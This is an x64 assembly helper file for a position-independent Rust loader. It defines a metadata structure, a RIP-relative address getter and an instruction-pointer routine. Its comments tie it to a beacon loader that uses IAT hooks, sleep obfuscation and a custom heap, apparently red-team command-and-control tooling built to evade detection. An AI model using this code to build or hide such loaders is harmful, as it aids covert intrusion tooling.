[BITS 64]

;--------------------------------------------------------------------------
; Misc helpers (x64) - Position-independent utilities and STUB metadata
;
; PURPOSE:
;   Provides position-independent primitives for Rust code that cannot be
;   safely implemented in Rust without breaking PIC (position-independent code).
;
; FUNCTIONS:
;   - Stub:     STUB metadata structure (region/size/heap/logging)
;   - StubAddr: Returns runtime address of Stub (RIP-relative)
;   - GetIp:    Returns current instruction pointer (RIP)
;
; WHY ASSEMBLY?
;   1. Rust cannot safely get current instruction pointer
;   2. RIP-relative addressing is needed for position-independence
;   3. STUB must be at known location for hooks to access runtime data
;
; SECTION PLACEMENT:
;   - .text$C: STUB data and StubAddr (middle of code section)
;   - .text$ZZ: GetIp and Leave marker (end of code section)
;--------------------------------------------------------------------------
GLOBAL GetIp
GLOBAL Stub
GLOBAL StubAddr

[SECTION .text$C]

;--------------------------------------------------------------------------
; Stub - STUB metadata structure
;
; PURPOSE:
;   Runtime data structure accessed by IAT hooks to get:
;   - Memory region bounds for sleep obfuscation encryption
;   - Custom heap handle for beacon allocations
;
; LAYOUT (must match Rust STUB struct in src/loader.rs):
;   Offset | Size | Field          | Description
;   -------|------|----------------|------------------------------------------
;   0x00   | 8    | Region         | Base address of allocated region
;   0x08   | 8    | RegionSize     | Total size of region in bytes
;   0x10   | 8    | StubSize       | Size of stub/loader code
;   0x18   | 8    | Heap           | Custom heap handle (from RtlCreateHeap)
;   0x20   | 4    | NumSections    | Number of PE sections
;   0x24   | 480  | Sections[20]   | Array of MemorySection structs
;   0x204  | 8    | Api (pointer)  | *mut Api → points to +0x20C storage
;   0x20C  | 8192 | Api (storage)  | Inline Api struct (filled by fill_stub)
;
; INITIALIZATION:
;   All fields start as 0 and are populated by loader's fill_stub().
;
; ACCESS:
;   Hooks use StubAddr() to get the runtime address of this structure.
;--------------------------------------------------------------------------
Stub:
    dq    0              ; +0x00: Region base address (8 bytes)
    dq    0              ; +0x08: Region size in bytes (8 bytes)
    dq    0              ; +0x10: Stub size in bytes (8 bytes)
    dq    0              ; +0x18: Custom heap handle (8 bytes)
    dd    0              ; +0x20: Number of sections (4 bytes)
    ; +0x24: sections[20] array - each MemorySection is 24 bytes
    ; MemorySection: base_address(8) + size(8) + current_protect(4) + previous_protect(4)
    times 480 db 0       ; 20 * 24 = 480 bytes
    ; +0x204: Api pointer (points to inline storage at +0x20C below)
    dq    0              ; *mut Api (8 bytes)
    ; +0x20C: Inline Api storage (filled by fill_stub via memcopy)
    ; Api is ~4300 bytes (with FramePool in each Config); reserve 8192 for safety
    times 8192 db 0      ; Api storage

;--------------------------------------------------------------------------
; StubAddr - Returns runtime address of STUB structure
;
; PURPOSE:
;   Provides position-independent access to the STUB metadata structure.
;   Uses RIP-relative addressing (LEA [rel Stub]) to calculate the runtime
;   address regardless of where the code is loaded.
;
; CALLING CONVENTION:
;   No arguments
;
; RETURNS:
;   RAX = Runtime address of Stub structure
;
; WHY ASSEMBLY?
;   Rust cannot safely perform RIP-relative addressing without relocations.
;   This function enables true position-independent STUB access.
;
; USAGE FROM RUST:
;   let stub_ptr = StubAddr() as PSTUB;
;   let custom_heap = (*stub_ptr).heap;
;--------------------------------------------------------------------------
StubAddr:
    lea    rax, [rel Stub]  ; Calculate runtime address of Stub (RIP-relative)
    ret                     ; Return address in RAX

[SECTION .text$ZZ]

;--------------------------------------------------------------------------
; GetIp - Returns current instruction pointer (RIP)
;
; PURPOSE:
;   Retrieves the current instruction pointer for position-independent
;   offset calculations (OFFSET macro and G_END function in Rust).
;
; HOW IT WORKS:
;   1. CALL pushes return address (next instruction) onto stack
;   2. POP retrieves that return address into RAX
;   3. SUB 5 adjusts back to the CALL instruction address
;
; CALLING CONVENTION:
;   No arguments
;
; RETURNS:
;   RAX = Current instruction pointer (address of CALL instruction)
;
; WHY ASSEMBLY?
;   Rust has no safe way to retrieve the instruction pointer without breaking
;   position-independence. This technique is standard for PIC shellcode.
;
; USAGE FROM RUST:
;   Used by OFFSET() and G_END() macros for runtime address calculations.
;--------------------------------------------------------------------------
GetIp:
    call    get_ret_ptr     ; Push next instruction address onto stack

get_ret_ptr:
    pop    rax              ; Pop return address into RAX
    sub    rax, 5           ; Adjust back 5 bytes (size of CALL instruction)
    ret                     ; Return RIP in RAX

; Note: No marker at end - CONFIG struct from CNA is directly after GetIp
